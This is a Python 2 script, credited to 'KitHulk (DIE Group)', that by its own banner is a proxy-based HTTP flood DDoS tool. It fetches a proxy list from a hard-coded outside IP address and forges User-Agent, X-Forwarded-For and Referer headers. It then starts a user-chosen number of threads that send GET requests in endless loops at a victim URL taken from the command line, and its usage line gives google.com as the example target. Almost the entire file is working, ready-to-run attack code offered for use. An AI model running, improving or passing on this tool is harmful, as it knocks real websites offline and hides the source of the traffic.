#!/usr/bin/env python
#coding: utf-8
#coder by KitHulk (DIE Group)
import sys
import random
import socket
import threading
import time
import datetime
import urllib
#GET USER-AGENT
def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

reFerers = [
        "https://www.google.com.vn/?gws_rd=ssl#q=",
        "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..",
        "http://vk.com/profile.php?redirect=",
        "http://www.usatoday.com/search/results?q=",
        "http://yandex.ru/yandsearch?text=",
        "http://go.mail.ru/search?mail.ru=1&q=",
        "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
        "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
        "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..",
        "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..",
        "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..",
        "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
        "http://www.google.ru/url?sa=t&rct=?j&q=&e..",
        "http://help.baidu.com/searchResult?keywords=",
        "http://www.bing.com/search?q=",
        "https://www.yandex.com/yandsearch?text=",
        "https://duckduckgo.com/?q=",
        "http://www.ask.com/web?q=",
        "http://search.aol.com/aol/search?q=",
        "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
        "http://validator.w3.org/feed/check.cgi?url=",
        "http://host-tracker.com/check_page/?furl=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "http://jigsaw.w3.org/css-validator/validator?uri=",
        "https://add.my.yahoo.com/rss?url=",
        "http://engadget.search.aol.com/search?q=",
        "https://steamcommunity.com/market/search?q=",
        "http://filehippo.com/search?q=",
        "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
        "http://eu.battle.net/wow/en/search?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://careers.gatesfoundation.org/search?q=",
        "http://techtv.mit.edu/search?q=",
        "http://www.ustream.tv/search?q=",
        "http://www.ted.com/search?q=",
        "http://funnymama.com/search?q=",
        "http://itch.io/search?q=",
        "http://jobs.rbs.com/jobs/search?q=",
        "http://taginfo.openstreetmap.org/search?q=",
        "http://www.baoxaydung.com.vn/news/vn/search&q=",
        "https://play.google.com/store/search?q=",
        "http://www.tceq.texas.gov/@@tceq-search?q=",
        "http://www.reddit.com/search?q=",
        "http://www.bestbuytheater.com/events/search?q=",
        "https://careers.carolinashealthcare.org/search?q=",
        "http://jobs.leidos.com/search?q=",
        "http://jobs.bloomberg.com/search?q=",
        "https://www.pinterest.com/search/?q=",
        "http://millercenter.org/search?q=",
        "https://www.npmjs.com/search?q=",
        "http://www.evidence.nhs.uk/search?q=",
        "http://www.shodanhq.com/search?q="]	

keyWords = [
	"sex",
        "World Cup",
        "singer",
        "ISIS",
        "facebook",
        "anonymous"]

def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]

def randomReFerer():
    return random.choice(reFerers) 

def randomKeyWord():
    return random.choice(keyWords) 
 
class attacco(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + randomKeyWord() + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
 
 

#Main
print("        .----.  KitHulk - DIE Group  .----.        ")				
print("------(.:.  Ddos/Dos With Proxy List. Using: kithulk http://victim number_thread Ex: kithulk http://google.com 1000.:.)------")
 
# Site
url = sys.argv[1]
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 
#Proxy
proxyf = urllib.urlopen("http://123.30.209.165/proxy.txt").read()
listaproxy = proxyf.split('\n')

#So luong
thread = sys.argv[2]
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
 
for x in xrange(int(thread)):
    attacco().start()
    time.sleep(0.003)
    print "Dang chuan bi luong Ddos " + str(x) + "!"
print "Dang Bat Dau Tan Cong..."
nload = 0
while not nload:
    time.sleep(1)